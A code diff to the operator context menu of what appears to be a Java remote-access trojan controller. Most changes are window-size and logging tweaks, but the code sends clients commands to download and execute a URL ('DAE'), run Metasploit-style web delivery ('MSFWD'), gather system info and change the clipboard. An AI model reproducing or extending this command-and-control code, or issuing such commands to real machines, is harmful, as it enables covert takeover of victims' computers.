@@ -81,14 +81,14 @@ class IPContextMenu implements Repository {
             stage.initStyle(StageStyle.UNDECORATED);
             stage.setMinWidth(300);
             stage.setMinWidth(300);
-            stage.setScene(new Scene(new DownloadAndExecuteView().getDownloadAndExecuteView(stage), 400, 400));
+            stage.setScene(new Scene(new DownloadAndExecuteView().getDownloadAndExecuteView(stage), 400, 200));
             stage.show();
             DownloadAndExecuteView.getDownloadButton().setOnAction(a -> {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                     try {
                         // TODO put in url regex check
                         String url = DownloadAndExecuteView.getUrlFieldValue();
-                        Logger.log(Level.INFO, "Sending DaE with: " + url);
+                        Logger.log(Level.INFO, "Sending DaE for: " + url);
                         clientObject.clientCommunicate("DAE " + url);
                         //clientObject.clientCommunicate("CMD " + SendCommandView.getTextField().getText());
                     } catch (IOException e1) {
@@ -108,7 +108,6 @@ class IPContextMenu implements Repository {
             stage.show();
             if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                 try {
-                    System.out.println("SENDING SYSINFO");
                     clientObject.clientCommunicate("SYINFO");
                 } catch (IOException e1) {
                     e1.printStackTrace();
@@ -124,11 +123,13 @@ class IPContextMenu implements Repository {
             stage.setMinHeight(300);
             stage.setScene(new Scene(new WebDeliveryView().getWebDeliveryView(stage), 400, 300));
             stage.show();
+            WebDeliveryView.getTargetsComboBox().getSelectionModel().selectFirst();
             WebDeliveryView.getExecuteButton().setOnAction(a -> {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                     try {
                         String target = WebDeliveryView.getTargetsComboBox().getSelectionModel().getSelectedItem().toString().toLowerCase();
                         clientObject.clientCommunicate("MSFWD " + target + " " + WebDeliveryView.getUrl().getText());
+                        stage.close();
                     } catch (IOException e1) {
                         e1.printStackTrace();
                     }
@@ -144,7 +145,7 @@ class IPContextMenu implements Repository {
             stage.initStyle(StageStyle.UNDECORATED);
             stage.setMinHeight(150);
             stage.setMinWidth(300);
-            stage.setScene(new Scene(new SetClipboardView().getSetClipboardView(stage), 300, 200));
+            stage.setScene(new Scene(new SetClipboardView().getSetClipboardView(stage), 300, 225));
             stage.show();
             SetClipboardView.getSetClipboardButton().setOnAction(a -> {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
@@ -185,7 +186,7 @@ class IPContextMenu implements Repository {
             stage.initStyle(StageStyle.UNDECORATED);
             stage.setMinHeight(100);
             stage.setMinWidth(300);
-            stage.setScene(new Scene(new VisitWebsiteView().getVisitWebsiteView(stage)));
+            stage.setScene(new Scene(new VisitWebsiteView().getVisitWebsiteView(stage), 400, 200));
             stage.show();
             VisitWebsiteView.getGoButton().setOnAction(a -> {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
@@ -204,7 +205,7 @@ class IPContextMenu implements Repository {
             stage.initStyle(StageStyle.UNDECORATED);
             stage.setMinHeight(100);
             stage.setMinWidth(300);
-            stage.setScene(new Scene(new ShowMessageboxView().getShowMessageboxView(stage)));
+            stage.setScene(new Scene(new ShowMessageboxView().getShowMessageboxView(stage), 400, 200));
             stage.show();
             ShowMessageboxView.getGoButton().setOnAction(a -> {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
